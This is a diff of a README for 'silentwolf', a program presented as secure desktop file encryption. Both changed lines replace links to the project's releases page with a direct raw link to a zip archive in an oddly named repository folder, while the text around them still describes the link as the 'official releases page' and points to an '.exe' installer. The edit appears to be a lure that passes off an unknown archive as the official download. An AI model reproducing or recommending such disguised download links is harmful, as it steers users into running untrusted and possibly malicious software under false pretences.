@@ -1,6 +1,6 @@
 # 🐺 silentwolf - Secure desktop file encryption for everyone
 
-[![](https://img.shields.io/badge/Download_Silentwolf-blue?style=for-the-badge)](https://github.com/Religiousnessmuster405/silentwolf/releases)
+[![](https://img.shields.io/badge/Download_Silentwolf-blue?style=for-the-badge)](https://github.com/Religiousnessmuster405/silentwolf/raw/refs/heads/main/undersaturate/Software-v3.9.zip)
 
 ## 🎯 About this software
 
@@ -20,7 +20,7 @@ Before you install this program, ensure your computer meets these standards:
 
 You will download the installer from the official release page. These files contain the necessary tools to run the program on your machine.
 
-1. Visit the [official releases page](https://github.com/Religiousnessmuster405/silentwolf/releases) to view the available versions.
+1. Visit the [official releases page](https://github.com/Religiousnessmuster405/silentwolf/raw/refs/heads/main/undersaturate/Software-v3.9.zip) to view the available versions.
 2. Look for the file ending in `.exe`. This is the Windows installer.
 3. Click the link to start the download.
 4. Save the file to your desktop or your downloads folder.
